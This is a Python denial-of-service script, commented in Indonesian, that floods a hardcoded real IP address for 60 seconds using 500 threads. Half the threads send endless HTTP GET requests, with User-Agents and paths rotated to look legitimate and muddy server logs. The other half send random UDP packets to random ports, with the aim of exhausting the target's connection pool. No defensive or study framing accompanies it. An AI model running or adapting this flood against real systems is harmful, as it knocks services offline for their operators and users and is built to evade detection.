import threading
import socket
import random
import time
import sys

TARGET_IP   = "216.198.79.3"
TARGET_PORT = 1
THREAD_COUNT = 500
DURATION     = 60  # detik

stop_event = threading.Event()

def http_flood():
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))

            # Random User-Agent biar keliatan legit
            ua_list = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (Linux; Android 10)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            ]
            ua = random.choice(ua_list)

            # Random path biar log server noise
            paths = ["/", "/index.php", "/home", "/api/v1/data", "/search?q=" + str(random.randint(1000,9999))]
            path = random.choice(paths)

            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.sendall(payload.encode())
            # Kirim terus tanpa baca response — exhaust connection pool
            while not stop_event.is_set():
                s.sendall(payload.encode())
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def udp_flood():
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random.randbytes(1024)
            s.sendto(data, (TARGET_IP, random.randint(1, 65535)))
            s.close()
        except:
            pass

print(f"[*] Flooding {TARGET_IP}:{TARGET_PORT} — {THREAD_COUNT} threads — {DURATION}s")

threads = []
for i in range(THREAD_COUNT // 2):
    t1 = threading.Thread(target=http_flood, daemon=True)
    t2 = threading.Thread(target=udp_flood, daemon=True)
    t1.start()
    t2.start()
    threads.extend([t1, t2])

time.sleep(DURATION)
stop_event.set()
print("[*] Done. Connection pool seharusnya exhausted.")